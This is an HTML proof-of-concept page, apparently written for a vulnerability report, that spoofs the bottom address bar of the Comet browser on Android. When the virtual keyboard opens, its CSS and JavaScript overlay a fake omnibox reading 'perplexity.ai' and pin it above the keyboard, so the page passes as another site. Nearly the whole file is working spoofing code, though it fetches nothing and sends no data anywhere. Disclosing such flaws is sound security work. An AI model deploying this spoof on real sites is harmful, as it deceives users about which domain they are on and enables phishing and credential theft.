<!DOCTYPE html>
<html lang="id">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>PoC - Comet Browser Android Bottom Address Bar Spoofing</title>

    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Roboto, "Droid Sans", sans-serif;
            background-color: #f5f5f5;
            color: black;
            height: 200vh;
        }


        button,
        textarea {
            font-size: 16px;
            width: 100%;
            box-sizing: border-box;
            border-radius: 8px;
            border: 1px solid #ccc;
        }


        button {
            padding: 12px;
            margin-bottom: 20px;
            cursor: pointer;
            background: #007bff;
            color: white;
            border: none;
            font-weight: bold;
        }


        textarea {
            padding: 10px;
            height: 100px;
            margin-bottom: 20px;
        }


        /* =====================================================
       OUTER COMET TOOLBAR
       ===================================================== */

        .fake-bar-wrapper {
            position: fixed;

            left: 0;
            width: 100%;

            z-index: 9999;

            background-color: #111111;

            /* Jarak atas dan bawah dibuat lebih lega */
            padding: 9px 32px;

            box-sizing: border-box;

            opacity: 0;
            visibility: hidden;

            transition:
                opacity 0.2s ease,
                bottom 0.1s ease;

            pointer-events: none;

            display: flex;
            align-items: center;

            border-radius: 0;

            box-shadow:
                0 -2px 8px rgba(0, 0, 0, 0.35);
        }


        .fake-bar-wrapper.show {
            opacity: 1;
            visibility: visible;
            pointer-events: auto;
        }


        .comet-omnibox {
            width: 100%;

            /* Sedikit lebih tipis */
            height: 44px;

            background-color: #1d1d1c;

            border-radius: 24px;

            display: flex;
            align-items: center;

            padding: 0 15px;

            box-sizing: border-box;

            border: 1px solid rgba(255, 255, 255, 0.10);

            box-shadow:
                inset 0 1px 1px rgba(255, 255, 255, 0.025);
        }


        /* =====================================================
       THREE DOTS
       ===================================================== */

        .menu-button {

            width: 24px;
            height: 40px;

            display: flex;

            flex-direction: column;

            justify-content: center;

            align-items: center;

            gap: 4px;

            flex-shrink: 0;

            margin-right: 10px;
        }


        .menu-dot {

            width: 5px;
            height: 5px;

            background-color: #eeeeee;

            border-radius: 50%;

            opacity: 0.9;
        }


        /* =====================================================
       URL
       ===================================================== */

        .url-text {

            flex: 1;

            min-width: 0;

            color: #eeeeee;

            /*
       * Ukuran dibuat seperti screenshot,
       * tidak terlalu besar.
       */
            font-size: 16px;

            font-weight: 400;

            text-align: center;

            white-space: nowrap;

            overflow: hidden;

            text-overflow: ellipsis;

            letter-spacing: 0;
        }


        /* =====================================================
       REFRESH
       ===================================================== */

        .refresh-button {

            width: 30px;
            height: 40px;

            display: flex;

            align-items: center;

            justify-content: center;

            flex-shrink: 0;

            margin-left: 10px;
        }


        .refresh-icon {

            width: 25px;
            height: 25px;

            color: #eeeeee;

            opacity: 0.95;
        }


        /* =====================================================
       PAGE
       ===================================================== */

        .spacer {
            height: 100vh;
        }


        .bottom-anchor {

            height: 100px;

            text-align: center;

            padding: 20px;

            background: #ddd;
        }


        /* =====================================================
       SMALL SCREEN
       ===================================================== */

        @media (max-width: 390px) {

            .fake-bar-wrapper {
                padding-left: 12px;
                padding-right: 12px;
            }


            .comet-omnibox {
                height: 46px;
                padding-left: 14px;
                padding-right: 14px;
            }


            .omnibox-url,
            .url-text {
                font-size: 15px;
            }


            .menu-button {
                margin-right: 7px;
            }


            .refresh-button {
                margin-left: 7px;
            }

        }
    </style>

</head>


<body>


    <h2>Vulnerability PoC - Comet Browser Android Spoof Bar by k4tedu</h2>


    <p>
        Click the “Go to perplexity.ai” button or the textarea
        on the page to bring up the virtual keyboard
    </p>


    <button id="showBtn">
        Go to perplexity.ai
    </button>


    <textarea id="ta" placeholder="Tap here..."></textarea>


    <!-- =====================================================
       FAKE COMET OMNIBOX
       ===================================================== -->

    <div class="fake-bar-wrapper" id="fakeBar">

        <div class="comet-omnibox">


            <!-- THREE DOTS -->

            <div class="menu-button">

                <span class="menu-dot"></span>

                <span class="menu-dot"></span>

                <span class="menu-dot"></span>

            </div>


            <!-- URL -->

            <span class="url-text">
                perplexity.ai
            </span>


            <!-- REFRESH -->

            <div class="refresh-button">

                <svg class="refresh-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
                    stroke-linecap="round" stroke-linejoin="round">

                    <path d="M21 12a9 9 0 1 1-2.64-6.36"></path>

                    <path d="M21 3v6h-6"></path>

                </svg>

            </div>

        </div>

    </div>


    <div class="spacer"></div>


    <div class="bottom-anchor">
        Bagian Bawah Halaman
    </div>


    <script>

        const fakeBar =
            document.getElementById('fakeBar');

        const ta =
            document.getElementById('ta');


        function adjustFakeBar() {

            const vv = window.visualViewport;

            if (vv) {

                const keyboardHeight =
                    window.innerHeight -
                    vv.height -
                    vv.offsetTop;

                fakeBar.style.bottom =
                    (keyboardHeight > 0
                        ? keyboardHeight
                        : 0
                    ) + 'px';

            }

        }


        function showFakeBar() {

            fakeBar.classList.add('show');

            if (window.visualViewport) {
                adjustFakeBar();
            }

        }


        function hideFakeBar() {

            fakeBar.classList.remove('show');

        }


        if ('visualViewport' in window) {

            window.visualViewport.addEventListener(
                'resize',
                adjustFakeBar
            );

            window.visualViewport.addEventListener(
                'scroll',
                adjustFakeBar
            );

        }


        document
            .getElementById("showBtn")
            .onclick = () => {

                ta.focus();

                showFakeBar();

            };


        ta.addEventListener(
            'focus',
            showFakeBar
        );


        ta.addEventListener(
            'blur',
            hideFakeBar
        );

    </script>


</body>

</html>
